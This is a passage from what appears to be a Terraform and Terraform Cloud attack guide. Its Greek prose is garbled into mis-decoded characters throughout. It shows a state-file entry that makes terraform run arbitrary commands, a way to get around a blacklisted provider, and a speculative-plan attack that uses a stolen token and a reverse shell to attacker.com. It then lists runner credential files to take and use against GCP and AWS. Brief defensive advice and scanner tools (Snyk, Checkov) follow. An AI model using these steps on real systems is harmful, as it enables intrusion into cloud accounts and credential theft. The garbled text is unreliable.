Î¼ÎµÏ„Î¬ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ ÏƒÎ±Ï‚, ÎºÎ±Î¸Î±ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Ï€Î¯ÏƒÏ‰ Ï„Î± Î¯Ï‡Î½Î·. Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎºÎ±Î¹ Î¼Î¹Î± Ï€Î»Î®ÏÎ· demo Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ ÏƒÏ„Î¿ [GitHub repository hosting the source code for this provider](https://github.com/offensive-actions/terraform-provider-statefile-rce).

Î“Î¹Î± Î½Î± Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚, Î±Ï€Î»ÏÏ‚ ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î¬Î²ÎµÏ„Îµ Ï„Î¿ Î±ÎºÏŒÎ»Î¿Ï…Î¸Î¿ ÏƒÎµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î¸Î­ÏƒÎ· Ï„Î¿Ï… `resources` array ÎºÎ±Î¹ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼ÏŒÏƒÏ„Îµ Ï„Î± attributes `name` ÎºÎ±Î¹ `command`:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Î¤ÏŒÏ„Îµ, Î¼ÏŒÎ»Î¹Ï‚ ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Ï„Î¿ `terraform`, Î¿ ÎºÏÎ´Î¹ÎºÎ¬Ï‚ ÏƒÎ±Ï‚ Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯.

### Î”Î¹Î±Î³ÏÎ±Ï†Î® resources <a href="#deleting-resources" id="deleting-resources"></a>

Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ 2 Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ­ÏˆÎµÏ„Îµ resources:

1. **Î•Î¹ÏƒÎ¬Î³ÎµÏ„Îµ Î­Î½Î± resource Î¼Îµ Ï„Ï…Ï‡Î±Î¯Î¿ ÏŒÎ½Î¿Î¼Î± ÏƒÏ„Î¿ state file Ï€Î¿Ï… Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ ÏƒÏ„Î¿ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ resource Ï€ÏÎ¿Ï‚ ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ¿Ï†Î®**

Î•Ï€ÎµÎ¹Î´Î® Ï„Î¿ `terraform` Î¸Î± Î´ÎµÎ¹ ÏŒÏ„Î¹ Ï„Î¿ resource Î´ÎµÎ½ Î¸Î± Î­Ï€ÏÎµÏ€Îµ Î½Î± Ï…Ï€Î¬ÏÏ‡ÎµÎ¹, Î¸Î± Ï„Î¿ ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ (Î±ÎºÎ¿Î»Î¿Ï…Î¸ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ resource ID Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Ï…Ï€Î¿Î´ÎµÎ¹Ï‡Î¸ÎµÎ¯). Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï€ÏŒ Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÏƒÎµÎ»Î¯Î´Î±:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿Î½ Ï€ÏŒÏÎ¿ ÏÏƒÏ„Îµ Î½Î± Î´Î¹Î±Î³ÏÎ±Ï†ÎµÎ¯ Î¼Îµ Ï„ÏÏŒÏ€Î¿ Ï€Î¿Ï… Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ® Ï„Î¿Ï… (Î¿Ï€ÏŒÏ„Îµ Î¸Î± Î´Î¹Î±Î³ÏÎ±Ï†ÎµÎ¯ ÎºÎ±Î¹ Î¸Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ Î¾Î±Î½Î¬)**

Î“Î¹Î± Î­Î½Î± EC2 instance, Î· Î±Î»Î»Î±Î³Î® Ï„Î¿Ï… Ï„ÏÏ€Î¿Ï… Ï„Î¿Ï… instance ÎµÎ¯Î½Î±Î¹ Î±ÏÎºÎµÏ„Î® Î³Î¹Î± Î½Î± ÎºÎ¬Î½ÎµÎ¹ Ï„Î¿ terraform Î½Î± Ï„Î¿ Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ ÎºÎ±Î¹ Î½Î± Ï„Î¿ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¾Î±Î½Î¬.

### Î‘Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î¿Ï… blacklisted provider

Î£Îµ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€Î¿Ï… ÏƒÏ…Î½Î±Î½Ï„Î®ÏƒÎµÏ„Îµ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÏŒÏ€Î¿Ï… `hashicorp/external` Î­Ï‡ÎµÎ¹ Î²ÏÎµÎ¸ÎµÎ¯ ÏƒÎµ blacklisted, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÏ€Î±Î½Î±-Ï…Î»Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ `external` provider ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ Ï„Î± ÎµÎ¾Î®Ï‚. Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·: Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ¼Îµ Î­Î½Î± fork Ï„Î¿Ï… external provider Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Î´Î·Î¼Î¿ÏƒÎ¹ÎµÏ…Ï„ÎµÎ¯ ÏƒÏ„Î¿ https://registry.terraform.io/providers/nazarewk/external/latest. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î´Î·Î¼Î¿ÏƒÎ¹ÎµÏÏƒÎµÏ„Îµ Ï„Î¿ Î´Î¹ÎºÏŒ ÏƒÎ±Ï‚ fork Î® ÎµÏ€Î±Î½-Ï…Î»Î¿Ï€Î¿Î¯Î·ÏƒÎ·.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Î¤ÏŒÏ„Îµ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ `external` ÏŒÏ€Ï‰Ï‚ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE and credential exfiltration

Î‘Ï…Ï„ÏŒ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Ï„Î¿Ï…Ï‚ Terraform Cloud (TFC) runners ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Ï„Ï‰Î½ speculative plans Î³Î¹Î± Î½Î± pivot ÏƒÏ„Î¿ target cloud account.

- Î ÏÎ¿Ï‹Ï€Î¿Î¸Î­ÏƒÎµÎ¹Ï‚:
- ÎšÎ»Î­ÏˆÏ„Îµ Î­Î½Î± Terraform Cloud token Î±Ï€ÏŒ Î¼Î¹Î± Î¼Î·Ï‡Î±Î½Î® Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î®. Î¤Î¿ CLI Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÎ¹ tokens ÏƒÎµ Î±Ï€Î»ÏŒ ÎºÎµÎ¯Î¼ÎµÎ½Î¿ ÏƒÏ„Î¿ `~/.terraform.d/credentials.tfrc.json`.
- Î¤Î¿ token Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î·Î½ target organization/workspace ÎºÎ±Î¹ Ï„Î¿Ï…Î»Î¬Ï‡Î¹ÏƒÏ„Î¿Î½ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± `plan`. Î¤Î± VCS-backed workspaces Î¼Ï€Î»Î¿ÎºÎ¬ÏÎ¿Ï…Î½ Ï„Î¿ `apply` Î±Ï€ÏŒ Ï„Î¿ CLI, Î±Î»Î»Î¬ ÎµÎ¾Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¿ÏÎ½ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ speculative plans.

- Î•Î½Ï„Î¿Ï€Î¯ÏƒÏ„Îµ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ workspace ÎºÎ±Î¹ VCS Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… TFC API:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- Î ÏÎ¿ÎºÎ±Î»Î­ÏƒÏ„Îµ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ± ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± ÎµÎ½ÏŒÏ‚ speculative plan Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ external data source ÎºÎ±Î¹ Ï„Î¿ Terraform Cloud "cloud" block Î³Î¹Î± Î½Î± ÏƒÏ„Î¿Ï‡ÎµÏÏƒÎµÏ„Îµ Ï„Î¿ VCS-backed workspace:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± rsync.sh Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Î­Î½Î± reverse shell ÏƒÏ„Î¿Î½ TFC runner:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
Î•ÎºÏ„Î­Î»ÎµÏƒÎµ Î­Î½Î± Î´Î¿ÎºÎ¹Î¼Î±ÏƒÏ„Î¹ÎºÏŒ ÏƒÏ‡Î­Î´Î¹Î¿ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹Ï‚ Ï„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± ÏƒÏ„Î¿Î½ ÎµÏ†Î®Î¼ÎµÏÎ¿ runner:
```bash
terraform init
terraform plan
```
- ÎšÎ±Ï„Î±Î³ÏÎ¬ÏˆÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î¬Î³ÎµÏ„Îµ Ï„Î± ÎµÎ³Ï‡Ï…Î¼Î­Î½Î± cloud credentials Î±Ï€ÏŒ Ï„Î¿Î½ runner. ÎšÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Ï„Ï‰Î½ runs, Ï„Î¿ TFC ÎµÎ³Ï‡Î­ÎµÎ¹ provider credentials Î¼Î­ÏƒÏ‰ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ ÎºÎ±Î¹ environment variables:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
Î‘Î½Î±Î¼ÎµÎ½ÏŒÎ¼ÎµÎ½Î± Î±ÏÏ‡ÎµÎ¯Î± ÏƒÏ„Î¿Î½ working directory Ï„Î¿Ï… runner:
- GCP:
- `tfc-google-application-credentials` (Î”Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· JSON Î³Î¹Î± Workload Identity Federation)
- `tfc-gcp-token` (Î²ÏÎ±Ï‡ÏÎ²Î¹Î¿ token Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ GCP)
- AWS:
- `tfc-aws-shared-config` (Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· web identity/OIDC Î³Î¹Î± Î±Î½Î¬Î»Î·ÏˆÎ· ÏÏŒÎ»Î¿Ï…)
- `tfc-aws-token` (Î²ÏÎ±Ï‡ÏÎ²Î¹Î¿ token Â· ÎºÎ¬Ï€Î¿Î¹Î¿Î¹ Î¿ÏÎ³Î±Î½Î¹ÏƒÎ¼Î¿Î¯ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ ÎºÎ»ÎµÎ¹Î´Î¹Î¬)

- Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¯Î·ÏƒÎµ Ï„Î± Î²ÏÎ±Ï‡ÏÎ²Î¹Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± ÎµÎºÏ„ÏŒÏ‚-ÎºÎ±Î½Î±Î»Î¹Î¿Ï Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹Ï‚ Ï„Î± VCS gates:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
ÎœÎµ Î±Ï…Ï„Î¬ Ï„Î± creds, Î¿Î¹ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î½/Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½/ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ­ÏˆÎ¿Ï…Î½ Ï€ÏŒÏÎ¿Ï…Ï‚ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ native CLIs, Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„Î¿Î½Ï„Î±Ï‚ PR-based workflows Ï€Î¿Ï… Î¼Ï€Î»Î¿ÎºÎ¬ÏÎ¿Ï…Î½ Ï„Î¿ `apply` Î¼Î­ÏƒÏ‰ VCS.

- Defensive guidance:
- Apply least privilege to TFC users/teams and tokens. Audit memberships and avoid oversized owners.
- Î ÎµÏÎ¹Î¿ÏÎ¯ÏƒÏ„Îµ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± `plan` ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î± VCS-backed workspaces ÏŒÏ€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎµÏ†Î¹ÎºÏ„ÏŒ.
- Î•Ï€Î¹Î²Î¬Î»ÎµÏ„Îµ provider/data source allowlists Î¼Îµ Sentinel policies Î³Î¹Î± Î½Î± Î¼Ï€Î»Î¿ÎºÎ¬ÏÎµÏ„Îµ `data "external"` Î® Î¬Î³Î½Ï‰ÏƒÏ„Î¿Ï…Ï‚ providers. Î”ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ Î¿Î´Î·Î³Î¯ÎµÏ‚ Ï„Î·Ï‚ HashiCorp Î³Î¹Î± provider filtering.
- Î ÏÎ¿Ï„Î¹Î¼Î®ÏƒÏ„Îµ OIDC/WIF Î±Î½Ï„Î¯ Î³Î¹Î± ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ cloud credentialsÂ· Î¸ÎµÏ‰ÏÎ®ÏƒÏ„Îµ Ï„Î¿Ï…Ï‚ runners ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î¿Ï…Ï‚. Î Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ speculative plan runs ÎºÎ±Î¹ Î±Ï€ÏÏŒÏƒÎ¼ÎµÎ½Î· egress.
- Î‘Î½Î¹Ï‡Î½ÎµÏÏƒÏ„Îµ exfiltration Ï„Ï‰Î½ `tfc-*` credential artifacts ÎºÎ±Î¹ ÎµÎ¹Î´Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Î³Î¹Î± ÏÏ€Î¿Ï€Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… `external` Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚ ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Ï„Ï‰Î½ plans.


## Î Î±ÏÎ±Î²Î¯Î±ÏƒÎ· Ï„Î¿Ï… Terraform Cloud

### Î§ÏÎ®ÏƒÎ· token

As **[explained in this post](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)**, terraform CLI stores tokens in plaintext at **`~/.terraform.d/credentials.tfrc.json`**. Î— ÎºÎ»Î¿Ï€Î® Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… token ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± Î¼Î¹Î¼Î·Î¸ÎµÎ¯ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… scope Ï„Î¿Ï… token.

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„ÏŒ Ï„Î¿ token, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿ org/workspace Î¼Îµ:
```bash
GET https://app.terraform.io/api/v2/organizations/acmecorp/workspaces/gcp-infra-prod
Authorization: Bearer <TF_TOKEN>
```
Î¤ÏŒÏ„Îµ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿Ï‚ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ **`terraform plan`** ÏŒÏ€Ï‰Ï‚ ÎµÎ¾Î·Î³Î®Î¸Î·ÎºÎµ ÏƒÏ„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ ÎºÎµÏ†Î¬Î»Î±Î¹Î¿.

### Î‘Ï€ÏŒÎ´ÏÎ±ÏƒÎ· ÏƒÏ„Î¿ cloud

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î±Î½ Î¿ runner Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î¿ cloud Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î±Ï€Î¿ÎºÏ„Î·Î¸ÎµÎ¯ Î­Î½Î± token Ï„Î¿Ï… principal Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï‚ Î¼Îµ Ï„Î¿Î½ runner ÎºÎ±Î¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ out of band.

- **GCP files (Ï€Î±ÏÏŒÎ½Ï„Î± ÏƒÏ„Î¿Î½ Ï„ÏÎ­Ï‡Î¿Î½Ï„Î± working directory Ï„Î·Ï‚ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚)**
- `tfc-google-application-credentials` â€” JSON config Î³Î¹Î± Workload Identity Federation (WIF) Ï€Î¿Ï… Î»Î­ÎµÎ¹ ÏƒÏ„Î¿ Google Ï€ÏÏ‚ Î½Î± Î±Î½Ï„Î±Î»Î»Î¬Î¾ÎµÎ¹ Ï„Î·Î½ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ® Ï„Î±Ï…Ï„ÏŒÏ„Î·Ï„Î±.
- `tfc-gcp-token` â€” Î²ÏÎ±Ï‡Ï…Ï€ÏÏŒÎ¸ÎµÏƒÎ¼Î¿ (â‰ˆ1 hour) GCP access token Ï€Î¿Ï… Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰

- **AWS files**
- `tfc-aws-shared-config` â€” JSON Î³Î¹Î± web identity federation/OIDC role assumption (Ï€ÏÎ¿Ï„Î¹Î¼ÏÎ¼ÎµÎ½Î¿ ÏƒÎµ ÏƒÏ‡Î­ÏƒÎ· Î¼Îµ ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ ÎºÎ»ÎµÎ¹Î´Î¹Î¬).
- `tfc-aws-token` â€” Î²ÏÎ±Ï‡Ï…Ï€ÏÏŒÎ¸ÎµÏƒÎ¼Î¿ token, Î® ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ IAM keys ÎµÎ¬Î½ ÎµÎ¯Î½Î±Î¹ Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½Î± Î´Î¹Î±Î¼Î¿ÏÏ†Ï‰Î¼Î­Î½Î±.


## Î•ÏÎ³Î±Î»ÎµÎ¯Î± Î‘Ï…Ï„ÏŒÎ¼Î±Ï„Î¿Ï… Î•Î»Î­Î³Ï‡Î¿Ï…

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Î— Snyk Ï€ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ Î¼Î¹Î± Î¿Î»Î¿ÎºÎ»Î·ÏÏ‰Î¼Î­Î½Î· Î»ÏÏƒÎ· ÏƒÎ¬ÏÏ‰ÏƒÎ·Ï‚ Infrastructure as Code (IaC) Ï€Î¿Ï… ÎµÎ½Ï„Î¿Ï€Î¯Î¶ÎµÎ¹ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÎºÎ±Î¹ Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½ÎµÏ‚ Î´Î¹Î±Î¼Î¿ÏÏ†ÏÏƒÎµÎ¹Ï‚ ÏƒÎµ Terraform, CloudFormation, Kubernetes, ÎºÎ±Î¹ Î¬Î»Î»ÎµÏ‚ Î¼Î¿ÏÏ†Î­Ï‚ IaC.

- **Î§Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬:**
- Î£Î¬ÏÏ‰ÏƒÎ· ÏƒÎµ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ Ï‡ÏÏŒÎ½Î¿ Î³Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ ÎºÎ±Î¹ Î¶Î·Ï„Î®Î¼Î±Ï„Î± ÏƒÏ…Î¼Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚.
- Î•Î½ÏƒÏ‰Î¼Î¬Ï„Ï‰ÏƒÎ· Î¼Îµ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± ÎµÎ»Î­Î³Ï‡Î¿Ï… Î­ÎºÎ´Î¿ÏƒÎ·Ï‚ (GitHub, GitLab, Bitbucket).
- Î‘Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î± pull requests ÎµÏ€Î¹Î´Î¹ÏŒÏÎ¸Ï‰ÏƒÎ·Ï‚.
- Î›ÎµÏ€Ï„Î¿Î¼ÎµÏÎµÎ¯Ï‚ ÏƒÏ…Î¼Î²Î¿Ï…Î»Î­Ï‚ Î±Ï€Î¿ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚.
- **Î•Î³Î³ÏÎ±Ï†Î®:** Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ ÏƒÏ„Î¿ [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ ÏƒÏ„Î±Ï„Î¹ÎºÎ®Ï‚ Î±Î½Î¬Î»Ï…ÏƒÎ·Ï‚ ÎºÏÎ´Î¹ÎºÎ± Î³Î¹Î± infrastructure as code (IaC) ÎºÎ±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ software composition analysis (SCA) Î³Î¹Î± ÎµÎ¹ÎºÏŒÎ½ÎµÏ‚ ÎºÎ±Î¹ Ï€Î±ÎºÎ­Ï„Î± Î±Î½Î¿Î¹Ï‡Ï„Î¿Ï ÎºÏÎ´Î¹ÎºÎ±.

Î£Î±ÏÏÎ½ÎµÎ¹ Ï…Ï€Î¿Î´Î¿Î¼Î­Ï‚ cloud Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), or [OpenTofu](https://opentofu.org/) ÎºÎ±Î¹ Î±Î½Î¹Ï‡Î½ÎµÏÎµÎ¹ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î± Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚ Ï€Î¿Ï… 